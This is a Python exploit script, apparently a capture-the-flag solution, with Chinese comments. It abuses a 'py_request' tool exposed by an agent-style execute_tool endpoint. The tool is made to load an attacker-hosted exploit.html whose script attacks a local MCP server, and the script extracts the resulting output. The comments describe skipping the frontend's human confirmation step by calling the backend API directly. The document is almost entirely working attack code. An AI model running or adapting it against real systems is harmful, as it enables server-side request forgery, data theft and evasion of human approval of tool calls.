import requests
import json
import time

def run_attack(exploit_url):
    print(f"[*] Sending attack request targeted at: {exploit_url}")
    
    # 目标是题目的 execute_tool 接口
    target_url = "http://cloud-big.hgame.vidar.club:32343/execute_tool"
    
    # 我们调用 py_request 工具，让它去访问我们的恶意页面
    # 恶意页面里的 JS 会去 POST 本地的 127.0.0.1:8001/mcp
    payload = {
        "name": "py_request",
        "arguments": {
            "url": exploit_url
        }
    }
    
    headers = {
        "Content-Type": "application/json"
    }
    
    try:
        # 发送请求
        # 注意：这需要人工在前端点击确认，但这里我们直接调接口。
        # 之前的测试表明 py_request 是可以直接调用的（返回了 example.com）。
        # 如果需要确认，可能是前端逻辑，后端接口本身可能没有强制确认（或者我们处于无会话状态默认允许？）
        # 不，之前的测试结果是 {"code":1, "result": "..."}，说明成功了。
        response = requests.post(target_url, json=payload, headers=headers)
        
        if response.status_code != 200:
            print(f"[-] Error: Server returned status {response.status_code}")
            print(response.text)
            return

        res_json = response.json()
        if res_json.get("code") == 1:
            raw_result = res_json.get("result", "")
            # raw_result 是 py_request 的返回值，即 {"status_code": ..., "content": "..."} 的 JSON 字符串
            
            # 解析内部 JSON
            import json
            try:
                inner_data = json.loads(raw_result)
                page_content = inner_data.get("content", "")
                
                # 寻找我们标记的 flag
                if "|||RESULT_START|||" in page_content:
                    start = page_content.find("|||RESULT_START|||") + len("|||RESULT_START|||")
                    end = page_content.find("|||RESULT_END|||")
                    extracted_data = page_content[start:end]
                    
                    print("\n[+] Exploitation Successful!")
                    print("[+] Extracted Data from MCP Server:")
                    print(extracted_data)
                    
                    # Try to parse if it looks like JSON, otherwise just leave it
                    try:
                        import ast
                        # Python dictionary string representation can be parsed safely with ast.literal_eval
                        parsed = ast.literal_eval(extracted_data)
                        if isinstance(parsed, dict) and 'out' in parsed:
                             print(f"\n[+] Data:\n {parsed['out']}")
                    except:
                        pass
                else:
                    print("[-] Could not find result markers in page content.")
                    print(f"Page Content Preview: {page_content[:200]}...")
            except json.JSONDecodeError:
                print("[-] Failed to parse internal JSON result.")
                print(raw_result)
        else:
            print("[-] Attack failed (API returned error code)")
            print(res_json)

    except Exception as e:
        print(f"[-] Exception: {e}")

if __name__ == "__main__":
    import sys
    if len(sys.argv) > 1:
        url = sys.argv[1]
    else:
        url = input("请输入通过 HTTP 可访问的 exploit.html 的 URL (e.g., http://your-vps/exploit.html): ")
    
    if not url.startswith("http"):
        print("URL must start with http")
    else:
        run_attack(url)
